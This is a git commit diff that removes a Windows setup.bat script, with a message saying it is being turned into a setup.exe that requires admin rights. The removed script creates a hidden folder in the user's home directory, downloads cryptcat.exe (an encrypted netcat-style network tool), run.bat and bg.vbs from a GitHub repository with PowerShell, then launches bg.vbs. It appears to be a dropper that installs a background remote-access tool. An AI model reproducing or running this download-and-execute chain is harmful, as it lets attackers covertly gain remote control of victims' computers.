c20d2ffb12b16c5f762be52cc850a9bffa1a5b5e
blood-source <bloodsource@github.com>
2021-02-17 11:35:56 -0600

    convert setup.bat to setup.exe and require admin

--- setup.bat
+++
@@ -1,7 +0,0 @@
-@ECHO OFF
-mkdir %HOMEDRIVE%%HOMEPATH%\.bs\
-powershell.exe Invoke-WebRequest -Uri "https://github.com/blood-source/testing/raw/bloodsource/cryptcat.exe" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\cryptcat.exe"
-powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blood-source/testing/bloodsource/run.bat" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\run.bat"
-powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blood-source/testing/bloodsource/bg.vbs" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\bg.vbs"
-cd /d %HOMEDRIVE%%HOMEPATH%\.bs\
-start bg.vbs
